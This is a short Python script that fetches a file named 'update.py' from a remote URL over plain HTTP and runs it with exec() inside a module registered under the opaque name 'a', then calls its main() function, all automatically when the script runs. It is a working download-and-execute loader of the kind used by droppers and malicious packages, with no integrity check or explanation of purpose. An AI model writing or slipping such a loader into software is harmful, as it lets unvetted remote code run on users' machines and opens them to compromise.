import sys
import types
import requests

def exec_module_from_url(url, module):
    response = requests.get(url)
    source = response.text
    exec(source, module.__dict__)

def execute():
    url = "http://example.com/assets/data/update.py"
    module_name = "a"

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec_module_from_url(url, module)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
